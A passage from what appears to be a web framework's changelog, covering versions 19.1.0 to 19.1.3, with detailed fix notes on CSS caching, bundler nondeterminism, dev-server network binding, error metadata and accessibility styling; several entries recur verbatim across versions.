  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **Every `app/` document shipped 156,738 bytes of uncacheable inline CSS, on every navigation.**
  `dev-render.ts` wrapped `stylesFor(surface)` in a `<style>` block, and the pipeline sends a page
  `Cache-Control: private, no-store` — so the same 1,336 rules from 406 module sources were
  re-sent and re-parsed on every click. Measured against ai-maxxing's running dev server: the same
  156,753-byte `<style>` element (156,738 bytes of CSS) in `/` and in `/fleet`, 84% of the 186,485-byte
  dashboard document and 59% of the 264,918-byte fleet one; the terminal's CSS and the session
  console's CSS are both in the dashboard, which draws neither. Nothing in the framework emitted a
  `<link rel="stylesheet">` anywhere, and this was never dev-only — `serve.ts` mounts the same
  `appRoutes`. A surface's CSS is now one content-hashed file, `/styles/<hash>.css` — the hash
  alone, so two surfaces whose CSS is byte-identical are one file, one download and one precache
  entry — served `public, max-age=31536000, immutable`, the island machinery's shape one asset over
  (`style-bundle.ts`, `style-routes.ts`, mounted by `x dev` and the container alike, written into
  the static export by `writeStyles`, and named in the service worker's precache manifest beside
  the island chunks). Still per surface, so a `site/` page never receives `app/` CSS; still in
  `<head>`, where a `<link>` is render-blocking exactly as the inline block was, so nothing flashes
  unstyled. Those two documents become 29,783 B and 108,216 B — the block out, a 51-byte link in —
  and the CSS becomes one request the browser keeps for a year instead of a re-parse per click.
  It REMOVES a CSP problem rather than adding one:
  `style-csp.ts` hashed 157 kB of surface CSS at boot to admit a block that no longer exists, and
  a same-origin stylesheet needs only the `'self'` `@ultimat3/http` already sends —
  `inlineStyleSources` now hashes only what a caller says it still emits inline, which in
  production is nothing at all and in `x dev` is the `/_x` shell plus the screenshot harness's
  frame style (never hashed before, and the harness links the file now too). Making `stylesFor`
  per ROUTE rather than per surface is the follow-up and is deliberately not attempted here.
- **An island chunk's URL was not deterministic, so the `immutable` cache never hit and the
  service worker precached a 404.** `Bun.build` is not byte-deterministic under `minify`: measured
  on 1.4.0 against ai-maxxing's 131,858-byte `session-console` island with no source file touched
  (`find -newermt` clean), TEN distinct `session-console-*.js` names in ten minutes, flipping BACK
  AND FORTH between values — roughly one build in ten emitted an output of IDENTICAL length
  differing only in minified identifier names (`var ca=Object.defineProperty` against
  `var la=…`), which is a race in the renamer and not an input anything can order. Both
  consequences were confirmed in that app: the precache manifest named
  `/islands/session-console-bbe72226.js`, which 404ed, and a 131 kB island was re-downloaded on
  every visit. `buildOne` now addresses the chunk by its INPUT — a sorted hash of the source-map's
  `sourcesContent`, plus the entry's app-relative path, the framework version and `Bun.version`,
  so a toolchain upgrade still mints a new URL — and a per-file cache serves the first byte string
  a process emitted for those inputs, so one URL answers one file for the life of the process.
  Twelve consecutive builds hash identically where the old scheme flapped. `sourcemap: 'external'`
  costs nothing measurable (277ms against 276ms on that island) and its `//# debugId=` line is
  stripped, so the shipped bytes and the `budget: { js }` number are unchanged; the deterministic
  alternative, `minify: { identifiers: false }`, was measured at 193,590 B against 131,649 B —
  +47% raw, +20% gzipped, on every island of every app — and refused. The URL is source-addressed
  rather than byte-addressed, so two processes building the same sources can serve two byte
  strings at one URL: they are the same program under different local identifier names, and that
  is the trade a nondeterministic bundler forces.
- **`x dev` rebuilt the whole app whenever git, an agent or a coverage run wrote a file.**
  `watchApp` watched the checkout recursively and excluded two names by `includes()`, so every
  write under `.git/`, `.personal/`, `dist/`, `coverage/` or `.claude/` ran a full `appManifest()`
  plus a `buildIslands()` over every island — and each of those re-minted every chunk URL, which
  is what turned the bundler race above into ten names in ten minutes. Measured in ai-maxxing,
  whose checkout carries all five and keeps two ENTIRE copies of the app under
  `.claude/worktrees/`, so one agent's edit rebuilt another's islands. `dev-watch.ts` names the
  seven directories that are never a source change and matches on a PATH SEGMENT rather than a
  substring — `includes('node_modules')` also excluded a directory legitimately named
  `my-node_modules-notes/`, and `includes('.x/')` excluded `apps/web/app/.xyz/`, both silently.
- **`x dev` no longer serves its live database to the network.** The web role bound
  `DEV_BINDING.hostname` — `localhost`, and the option's own docstring says why: "so a laptop on a
  café network is not serving the app to the café". The `sync` node on the very next port passed
  no hostname to `Bun.serve` at all and took its `0.0.0.0` default, so the one socket carrying
  `snapshot` and `patch` frames for every registered live query answered on every interface, while
  the app beside it did not. The metrics endpoint had the same gap from the other direction: it
  spread `options.http.hostname` only when `http` was defined, which is exactly not the case for
  `x dev`. `listenSyncNode` takes a `hostname` (still defaulting to every interface, which is what
  a container needs), `startRoles` resolves the binding ONCE as `options.http ?? DEV_BINDING` and
  gives it to both, and `WebBinding` moved to its own leaf module so `dev-sync` can read the
  default without an import cycle through `dev-roles`. Found in ai-maxxing, where `x dev` runs on
  a VPS reached over a LAN.
- **`problem+json` dropped an error's `meta`, so an island recovered an id by regex over
  `cause`.** An app's `X_SESSION_CHECKOUT_BUSY` carried `{ sessionId, title, state }` in `meta`,
  and `toProblem` rendered code, cause, fix, docs and `issues` — nothing else — so the dispatch
  island ran a UUID pattern over the prose to find the session it should link to. It could not
  simply carry `meta`: that bag is the framework's operator-only channel by contract —
  `bodyInvalid` keeps the body excerpt the parser choked on there, the limiter its internal key,
  core's `assert` the rejected value — and every one of those relied on it never reaching a
  caller. `registerProblemMeta({ X_SESSION_CHECKOUT_BUSY: ['sessionId', 'title', 'state'] })`
  (`packages/http/src/problem-meta.ts`) is the seam: per code, per key, beside
  `registerErrorStatus` and refusing what it refuses — a framework-owned code — plus `issues`,
  which has its own top-level home, and `__proto__`. The document carries the declared keys that
  are set as a top-level `meta` extension member, copied member by member, all-or-nothing (a
  `Date`, a `bigint`, a class instance, a cycle or a serialisation past `MAX_PROBLEM_META_BYTES`
  = 4096 drops the whole member — a document missing one declared key is a claim the server never
  made), absent rather than `{}`, and blanked with `cause` on an unclassified 5xx — which is also
  why both registrations are needed. `@ultimat3/action`'s typed client puts the member back on
  `RemoteActionError.meta`, under the four members that class owns, so `error.meta.sessionId`
  reads where the regex was. A bad declaration is `X_PROBLEM_META_INVALID` at boot.

- **An island handed props over the cap took the page down with a blank 500.**
  `X_ISLAND_PROPS_INVALID` had no row in `@ultimat3/http`'s status table — pinned "undecided" in
  `scripts/error-map-backlog.ts` — so it was an *unclassified* 500 and `toProblem` blanked its
  cause outside dev: a 34-row model catalog (8,812 B against a 4,096 B cap) answered "the details
  are in this process's logs" about an error whose whole value is the sentence naming the prop.
  Measured on ai-maxxing's `app/fleet/page.tsx`, 2026-09-05. Three changes. The code has a **row**
  (500 — the author's fault, never the caller's — and now a declared one, so the cause reaches
  prod). The cause names the **heaviest props with their bytes** (`props.models is 8,812 B of the
  8,900`) and the fix names the edit rather than "raise the cap": pass `models: []` beside
  `modelsEndpoint: derivePath('<query>')` and fetch after mount — a list that is the same on every
  request is a dataset, not a prop. And it is a **verify-time finding**: the `budgets` step
  already renders every budgeted route to weigh it (an `app/` page with an island derives one),
  and a render that threw `X_ISLAND_PROPS_INVALID` was filed as `X_BUDGET_UNMEASURED` — "run
  `x build` and read its list" for a sentence the build had already composed. `prerenderSite` now
  writes the throwable's `code`/`cause`/`fix` onto the report's `unmeasured` row, and
  `checkBudgets` reports that one code under its own name, at the route.
  `packages/render/README.md` documents the endpoint pattern with two examples that typecheck.

- **`x i18n check` told an app to "move `defineCatalogs()` into `packages/i18n/src/index.ts`"
  when the call was already there and the cause was two installed copies of `@ultimat3/i18n`.**
  ai-maxxing's root resolved 19.1.0 while its `packages/i18n` workspace still pinned `^19.0.0` and
  got its own copy under Bun's isolated layout; each copy is its own module instance with its own
  module-scope registry, so the app's index registered every catalog into one and the CLI read
  the other — `X_CATALOG_UNREGISTERED` over every key, with a fix naming an edit that changed
  nothing. The same split leaves the gate's `policy` step green over an undeclared grant
  (`isKnownPermission` checks nothing while its own copy holds no declaration) and is the
  in-`node_modules` form of the zero-entity manifest 19.1.0's `local-cli.ts` hand-over fixed for
  a global `x`. `packages/cli/src/duplicate-packages.ts` resolves `@ultimat3/i18n`,
  `@ultimat3/policy` and `@ultimat3/entity` from the app root, from every workspace and from the
  CLI's own directory, keyed by **realpath** — a workspace symlink to one checkout is one copy,
  two store entries at ONE version are two — and reports `X_PACKAGE_DUPLICATED` naming both
  copies, the origins that resolve each, and the `package.json` to pin (`set "@ultimat3/i18n":
  "19.1.0" in packages/i18n/package.json, then: bun install && x i18n check --json`; two copies
  of one version: `bun install --force`). `x i18n check` and the `i18n` step run it before reading
  the registry and rewrite every registration gap's cause and fix to the install's; the `policy`
  step runs it for policy and entity. Measured after the fact: today's ai-maxxing resolves one
  real directory per package from all fourteen origins, so the finding is silent there and on
  `examples/dummy`, and it would have fired on the morning's tree.

### Commits

- fix: eleven frictions two apps hit, and the two ratchets that caught the repair (#414)

## 19.1.3 - 2026-09-06

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **A stale service worker no longer walls the app off behind its own skew guard.** Both halves
  were sound and the pair was lethal. The generated `sw.js` stamps its `BUILD_ID` on every request
  it proxies; a server on a newer build answers that with `409 X_BUILD_SKEW`, whose body is a
  refusal page rather than the app. The refusal page is not the app, so nothing in it posts
  `skip-waiting`; the replacement worker stays `installed` and waiting, because a waiting worker
  takes over only once every client is released; and a reload re-enters the same worker, which
  stamps the same id and earns the same 409. Measured on a dev server restarted onto a new build:
  `waiting: "installed"`, `active: "activated"`, `x-precache-<new>` already downloaded, and every
  navigation 409 — for as long as the tab lived. Only a hand-posted `skip-waiting` from devtools
  recovered it, and the error's own advice was "reload the page". Three changes, each needed by
  the next: `@ultimat3/http` stamps `x-ultimate-build` on the refusal (a response that says "you
  are stale" while withholding what the server *is* cannot be acted on, and is indistinguishable
  from any other 409); the worker treats that response as the signal to stop stamping, re-issue
  the request untagged so the document actually loads, and post `AppUpdateAvailable` to every
  window naming the waiting build; and `buildSkew`'s `fix` stops advertising a remedy that
  provably does not remedy. A 409 carrying no *different* build id is left exactly alone — a route
  may answer a conflict of its own, and swallowing it would turn a conflict the app must handle
  into a silent retry with the guard switched off.

## 19.1.2 - 2026-09-06

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **`@ultimat3/core`'s `logger` no longer takes a browser bundle down at module init.**
  `export const logger = createLogger()` runs when the module is evaluated, `createLogger()` calls
  `envLevel()`, and `envLevel()` read a bare `process.env['LOG_LEVEL']` — a binding a browser does
  not have. Core's barrel is what every other package imports, and `@ultimat3/realtime`'s
  `channel.ts` calls `logger.warn`, so the shaker keeps `logger` in the chunk of any island that
  reaches a live subscription. Measured on ai-maxxing's session console island: the chunk contains
  `var pl=sr()` and threw `ReferenceError: process is not defined` at evaluation, the wrapper
  rendered `data-x-failed="process is not defined"`, and the island never mounted — no line of the
  app's own code had run. Both reads are now `typeof process === 'undefined'`-guarded, the same
  form `version.ts` already uses for `ULTIMATE_FRAMEWORK_VERSION`, and never an optional chain: one
  guards a value that is *nullish*, not a binding that is *undeclared*, so a bare `process?.env`
  throws the very `ReferenceError` it looks like it is preventing. `globalThis.process?.env` is a
  property access on an object that exists and so answers `undefined` rather than throwing — but it
  differs from the throwing form by a prefix, which is not a distinction to leave a reader to spot
  when one side of it is a browser crash. A browser takes the default level, `info`, which is the right
  answer — there is no environment there to have said otherwise. `defaultWriter` is the second half
  of the same defect one call deeper: a fixed init that still reached `process.stdout` would only
  move the throw from load to the first line written, and `channel.ts` writes one. It falls back to
  `console.error`/`console.log` on the same `toStderr` split, so a level does not change lane
  between runtimes; where there is a `process` it writes to the fd exactly as before.
  `packages/realtime/src/client.ts:51` had already worked around this locally — "the default
  reporter: `console.error`, never core's `logger` — that writes `process.stderr`" — and that
  workaround is now a preference rather than a necessity.

  The test is the reproduction: `logger-browser.test.ts` — its own file, because it builds and
  spawns where the rest of the logger's suite only calls — builds the barrel for
  `target: 'browser'` through a re-exporting wrapper (never `index.ts` as the entry, which Bun
  1.4.0 shakes down to its export clause, #276) and evaluates the chunk in a **subprocess with
  `globalThis.process` deleted**.
  That deletion is the whole point — `scripts/browser-barrel.test.ts` evaluates its chunks under
  plain `bun run`, where the binding exists and this entire class of defect is invisible. A
  negative control asserts a module-scope `process.env` read still throws in the same harness, so
  the assertions cannot pass vacuously on a runtime that quietly kept the global.

- **`visually-hidden` no longer widens the document it annotates.** `@mixin visually-hidden` in
  `packages/ui/src/tokens/_mixins.scss` set `position: absolute` and no inset, which is the
  canonical recipe (a11y-project's, Bootstrap's `.visually-hidden`) and is the one line it gets
  wrong. Absolute with no inset leaves the box at its STATIC position and only takes it out of
  flow; after a long run of inline text that position is already past the viewport edge, and the
  box escapes the truncating ancestor's `overflow: hidden` because that ancestor is not positioned
  and so is not its containing block. Measured in ai-maxxing, where `Link`'s `.hint` ("opens in a
  new tab") follows truncated titles: seven boxes with right edges from 753px to 1119px, making
  the document **1119px wide inside a 390px viewport** and 1480px inside a 1440px one — a whole
  page scrolling sideways for text no sighted user ever sees. Eight component stylesheets compose
  this mixin (`Link`, `Combobox`, `Table`, `Avatar`, `Checkbox`, `Radio`, `Switch`, `Dropzone`),
  so the defect was in every one of them. Now `inset-inline-start: 0` — logical, because this
  file's own header refuses a physical direction and `left: -9999px` parks the box a screen away
  on the wrong side in an RTL document. The INLINE start only: the block position stays static so
  that a hidden but focusable input — `Checkbox`, `Radio`, `Switch` and `Dropzone` each hide a real
  one through this mixin — still scrolls into view beside its own control, and a static block
  position cannot widen anything. Verified in a browser at 390×844 and 1440×900:
  `document.documentElement.scrollWidth === clientWidth`. `mixins.test.ts` reads the mixin's
  declarations the way `reset.test.ts` reads the reset's — there is no CSS engine in this process,
  so the source is the seam — and asserts the inset is present, that it is logical rather than
  physical, and that the mixin still hides what it is named for.

### Commits

- fix: a browser bundle survives core's logger, and visually-hidden stops widening the document (#410)

## 19.1.1 - 2026-09-05

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **`X_ERROR_FIX_PATH_MISSING` judged a path the repository never commits.** The first app whose
  fixes name its private files (`.personal/fleet.yml`, `.personal/providers.yml` — the right
  thing to tell a reader to edit) was green on every developer's disk and red on every CI runner,
  where the file cannot exist because the repo's own `.gitignore` says so. A citation under a
  directory the root `.gitignore` lists (`.personal/`, `/tmp/`, `node_modules`) is now the fourth
  exclusion beside scoped specifiers, dot-relative paths and app-facing parents: not judged, by
  design. Only the plain directory form is read; a glob, a negation or a nested pattern still
  errs towards judging. `packages/cli/src/fix-path.ts`, measured 2026-09-05.

### Commits

- fix(cli): a fix may cite a file the repository never commits (#408)
- chore(ci): bump docker/setup-buildx-action in the actions group (#403)
- test(cli): the composed island builds from a directory no earlier build has resolved
- docs(publishing): the npm-publish environment has no reviewers — the tag rule and the gate are the review

## 19.1.0 - 2026-09-05

Twelve defects surfaced by one app built on 19.0.0 — an AI-first control plane whose four UI
agents and one data agent each hit the framework at a seam nothing had measured. Every entry
below names its measurement. None is breaking.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **A globally installed `x` inside an app wrote a manifest with zero entities, green.** A
  `bun link` of a checkout — or `bun add -g` — is a second copy of every `@ultimat3/*` package, and
  a second module instance of `@ultimat3/entity` is a second, EMPTY registry: the app's entities
  register into the instance under its own `node_modules`, and the global CLI reads its own.
  Reproduced on a fresh `x new` scaffold with every package copied (not linked) into
  `node_modules`: `x entities list` → `0 entities`, `x policy list` → `0 permission(s), 0 role(s)`,
  `x manifest` → `5 routes, 0 actions`, exit 0 — which `x db gen` then read as "drop every
  table". The same split turned the `policy` step of `x verify` green over an undeclared grant:
  `isKnownPermission` deliberately checks nothing while no permission is declared, and the global
  instance had none. A second symptom: the app's own `@ultimat3/core` logger kept writing to
  stdout while the CLI's had moved to stderr, so `--json` output carried a log line as its first
  line.

  `packages/cli/src/local-cli.ts`: before `dispatch`, a CLI whose `import.meta.path` is not the
  realpath of the app's `node_modules/@ultimat3/cli/src/bin.ts` re-executes that file through
  `process.execPath`, prints one line on stderr, and exits with the child's code. The chain stops at
  one hop because the child's own path IS the local file. A workspace symlink (both tracked apps,
  every scaffold-smoke install) resolves to the same file and is not handed over; a compiled `x`
  keeps itself, because `/$bunfs/…` is no path `realpath` can resolve and the runtime image carries
  no `bun` to hand over to; `ULTIMATE_KEEP_GLOBAL_CLI=1` keeps the invoked CLI on purpose. Nothing in this
  repository's CI sets it — measured: `reference-app-gate.ts` runs `packages/cli/src/bin.ts`
  inside `examples/dummy`, whose `node_modules/@ultimat3/cli` is `../../../../packages/cli`.

- **`entity.$view([...])` could not be an action's `output:`.** It validated, and was refused at
  registration with `X_SCHEMA_UNSUPPORTED: cannot be projected to JSON Schema`, whose `fix:` told
  the author to re-declare it as `t.object({ ... })` — so every app kept a hand-copied object beside
  its entity, and `examples/dummy`'s `CommentView` had already drifted from its column
  (`minLength: 1` where the column says `max: 2000`). A view now carries the schema IR (`node`)
  every `t.*` schema carries, built per column by `columnNode()` in `packages/entity/src/view.ts`,
  and the projection publishes the ROW value's shape rather than the SQL type's: `bigint()` and
  `decimal()` are strings (the digits — a JS number is inexact past ±2^53), `date()` is a
  `YYYY-MM-DD` string, `money()` is `{ minor, currency, scale? }`, `enumerated()`/`tz()`/`locale()`
  are `enum`, a nullable column is `anyOf: [<type>, null]` and still required, `jsonb`/`bytea` are
  `unknown`. Proven end to end on the reference app: `CommentView` is `comments.$view([...])`,
  `x manifest` regenerates `openapi.json` with `CreateCommentOutput.body.maxLength: 2000`, and
  `x actions describe createComment` shows the same object on the MCP tool. The `fix:` names
  `$view` beside `t.object` now.

- **The `budgets` step rendered every authed page as the anonymous actor.** `prerender.ts` built one
  context for the whole build, and an `app/` page's `load` that reads a policy-guarded query
  denied it with `X_UNAUTHENTICATED` — so every authed route was `X_BUDGET_UNMEASURED` and an app
  with a signed-in surface could not be green. Weighing bytes needs no data authority: the
  weigh-and-discard branch now renders under `measurementActor()` (`kind: 'service'`,
  `permissions: ['*']`, `packages/cli/src/measurement-actor.ts`). `renderStatic` keeps the
  anonymous context, deliberately and pinned by test: a `site/` artifact is a published file, and
  a guarded query inside its `load` must fail the build rather than render another actor's rows
  into it. What this does not fix is stated: a page whose `load` needs a session's DATA (the
  reference app's `/settings` resolves a member row and throws its own `X_ACTOR_UNRESOLVED`) is
  still unmeasured, and the report says why.

- **`@ultimat3/db` reported a stale schema as "cannot reach the database".** Under `x dev` — PGlite,
  the driver that runs with no `DATABASE_URL` — every statement failure went to `dbUnavailable`,
  so a `select` naming a column whose migration had not run answered
  `X_DB_UNAVAILABLE: cannot reach the database — statement failed: select "id", "host_id", …`
  with the cause cut mid column-list, the Postgres message nowhere in it, and the fix "set
  DATABASE_URL" against a database that was answering. Three changes at the seam
  (`packages/db/src/errors.ts`, `sqlstate.ts`, `pglite.ts`): `pglite.ts` uses `driverError` as
  `statement-funnel.ts` already did; `42P01`/`42703` classify as **`X_DB_SCHEMA_STALE`** with the
